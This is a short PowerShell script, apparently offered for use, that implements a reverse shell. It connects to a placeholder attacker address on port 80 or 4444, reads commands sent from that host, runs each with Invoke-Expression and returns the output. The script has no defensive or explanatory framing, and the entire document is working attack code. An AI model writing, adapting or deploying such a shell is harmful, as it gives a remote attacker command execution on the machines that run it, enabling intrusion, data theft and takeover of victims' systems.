$client = New-Object System.Net.Sockets.TCPClient('YOUR_IP_ADDRESS', 80)  # Using port 80 (u can change to 4444 or which port u use )
$stream = $client.GetStream()
$writer = New-Object System.IO.StreamWriter($stream)
$reader = New-Object System.IO.StreamReader($stream)
$writer.AutoFlush = $true

while ($true) {
    $command = $reader.ReadLine()
    if ($command -eq 'exit') { break }
    $output = Invoke-Expression $command 2>&1
    $writer.WriteLine($output)
}

$client.Close()
